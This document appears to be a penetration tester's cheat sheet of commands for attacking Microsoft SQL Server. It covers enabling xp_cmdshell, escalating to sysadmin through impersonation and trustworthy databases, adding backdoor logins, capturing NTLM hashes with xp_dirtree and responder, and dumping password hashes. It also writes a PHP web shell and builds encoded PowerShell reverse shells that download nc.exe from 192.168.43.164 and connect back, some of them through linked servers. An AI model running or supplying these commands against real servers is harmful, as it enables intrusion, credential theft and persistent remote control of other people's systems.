# mssql-cmd

% mssql, Microsoft SQL Server, 1433
#plateform/linux  #target/remote  #protocol/sql  #port/1433 #cat/ATTACK


## configure - check extended stored procedures (xp_)
```sql
SELECT * FROM sys.configurations WHERE LOWER(name) LIKE N'%xp%';
```

## configure - turns on advanced options
```sql
sp_configure 'show advanced options', '1'
RECONFIGURE
```

## configure -  enable xp_cmdshell 
```sql
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

## configure -  enable Ole Automation Procedures
```sql
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE
```

## configure - online
```sql
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

## enum - Get xp_cmdshell configurations
```sql
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';
```

## enum - Get advanced options configurations
```sql
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'show advanced options';
```

## enum - Get databases
master, tempdb, model, msdb arr default DB
```sql
SELECT name FROM master.dbo.sysdatabases
```

## enum - Get tables of a databases
```sql
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
```

## enum - select records of a table
```sql
SELECT * FROM <databaseName>.<schemaName|dbo>.<tableName>
```

## enum - Get principals and their server-level roles
```sql
SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin FROM master.sys.server_principals r LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid WHERE r.type IN ('S','E','X','U','G');
```


## enum - Get principals and their database-level roles
will show NULL in case of insufficient privilge

```sql
use <db_name>; SELECT r.name AS role_principal_name, m.name AS member_principal_name FROM sys.database_role_members rm JOIN sys.database_principals r  ON rm.role_principal_id = r.principal_id JOIN sys.database_principals m ON rm.member_principal_id = m.principal_id
```

## enum - Get sysadmins
```sql
SELECT name,type_desc,is_disabled FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name
```

## enum - check server-level role
SELECT SYSTEM_USER;
```sql
SELECT IS_SRVROLEMEMBER('<role|sysadmin>');
```

## enum - check database-level role
SELECT SYSTEM_USER;
```sql
SELECT IS_ROLEMEMBER('<role|db_owner>');
```


## enum - identify users that we can impersonate
```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

## enum - check readfile priv (OPENROWSET)
```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```

## privesc - impersonate user
```sql
EXECUTE AS LOGIN = '<user|sa>';
```

## privesc - grant server-level role
```sql
EXEC sp_addsrvrolemember '<user>', '<role|sysadmin>';
```

## privesc - grant server-level role (db_owner / Trustworthy DB)
DROP PROCEDURE sp_privesc;
```sql
CREATE PROCEDURE sp_privesc WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember '<principal_name>', 'sysadmin' EXECUTE sp_privesc;
```


## persist - grant IMPERSONATE
```sql
GRANT IMPERSONATE ON LOGIN::<login|sa> to [<user>]
```


## persist - Create login with sysadmin privs
```sql
CREATE LOGIN jubeaz WITH PASSWORD = '<password|Jube@z123!';
```

## persist - add domain login with sysadmin privs
```sql
create login [<domain_netbios>\<user>] from windows;
```

## persist - add domain login with sysadmin privs
```sql
create login [<domain_netbios>\<user>] from windows;
```


## execute command
```sql
EXEC master..xp_cmdshell '<cmd|whoami /all>'
```
## Hash gathering - 
sudo impacket-smbserver share ./ -smb2support
sudo responder -I tun0
```sql
xp_dirtree '\\<ip>\any\thing'
exec master.dbo.xp_dirtree '\\<ip>\any\thing'
EXEC master..xp_subdirs '\\<ip>\anything\'
EXEC master..xp_fileexist '\\<ip>\anything\'
```

## reverseshell
python -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\temp\nc.exe"); c:\windows\temp\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
```sql
exec xp_cmdshell 'powershell -exec bypass -enc <b64_payload>
```


## extract hash for cracking
```sql
SELECT @@SERVERNAME + N'_' + [name] + N':' + CONVERT(NVARCHAR(256), password_hash, 1) FROM sys.sql_logins WHERE [name] NOT LIKE N'##%';
```

## read file (OPENROWSET)
```sql
SELECT * FROM OPENROWSET(BULK N'<path|C:/Windows/System32/drivers/etc/hosts>', SINGLE_CLOB) AS Contents
```

## write file
enable Ole Automation Procedures
```sql
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```

## Trustable Links - Get Linked Servers (exec)
```sql
EXEC sp_linkedservers
```

## Trustable Links - check extended stored procedures (xp_)
```sql
SELECT * FROM OPENQUERY("<srvname>",'SELECT * FROM sys.configurations WHERE LOWER(name) LIKE N''%xp%'';');
```

## Trustable Links - Get Linked Servers (select)
```sql
select * from master..sysservers
```
## Trustable Links - Get Linked Servers logins (select)
```sql
SELECT  sp.name, s.name, ll.remote_name FROM sys.linked_logins ll INNER JOIN sys.server_principals sp ON ll.local_principal_id = sp.principal_id INNER JOIN sys.servers s ON s.server_id = ll.server_id
```

## Trustable Links - Execute queries
```sql
select * from openquery("<srvname>", '<query>')
```

## Trustable Links - Get databases
master, tempdb, model, msdb arr default DB
```sql
SELECT * FROM OPENQUERY("<srvname>",'SELECT name FROM master.dbo.sysdatabases')
SELECT name FROM master.dbo.sysdatabases
```

## Trustable Links - Get tables of a databases
```sql
SELECT * FROM OPENQUERY("<srvname>",'SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES')
```

## Trustable Links - select records of a table
```sql
SELECT * FROM OPENQUERY("<srvname>",'SELECT * FROM <databaseName>.dbo.<tableName>')
```

## Trustable Links - create remote admin
```sql
EXECUTE('EXECUTE(''CREATE LOGIN <login|jubeaz> WITH PASSWORD = ''''<password|Jub@z123!>'''' '') AT "<remote_srvname>"') AT "<local_srvname>"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''<login|jubeaz>'''' , ''''sysadmin'''' '') AT "<remote_srvname>"') AT "<local_srvname>"
```

## Trustable Links - turns on advanced options
```sql
select 1 from openquery("<remote_srvname>", 'select 1; exec sp_configure ''show advanced options'', 1; reconfigure')
EXECUTE('sp_configure ''show advanced options'',1;reconfigure;') AT "<remote_srvname>"
```

## Trustable Links -  enable xp_cmdshell 
```sql
select 1 from openquery("<remote_srvname>", 'select 1; exec sp_configure ''xp_cmdshell'', 1; reconfigure')
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "<remote_srvname>"
```

## Trustable Links - check readfile priv (OPENROWSET)
```sql
SELECT * FROM OPENQUERY("<remote_srvname>",'SELECT * FROM fn_my_permissions(NULL, ''SERVER'') WHERE permission_name=''ADMINISTER BULK OPERATIONS'' OR permission_name=''ADMINISTER DATABASE BULK OPERATIONS'';');

```

## Trustable Links - test command exec 
if return 1 its good
```sql
select 1 from openquery("<remote_srvname>", 'select 1; exec master..xp_cmdshell ''dir c:''')
```


## Trustable Links - reverseshell
python -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\temp\nc.exe"); c:\windows\temp\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
```sql
select 1 from openquery("<remote_srvname>", 'select 1; exec master..xp_cmdshell ''powershell -exec bypass -enc <b64_payload>''')
```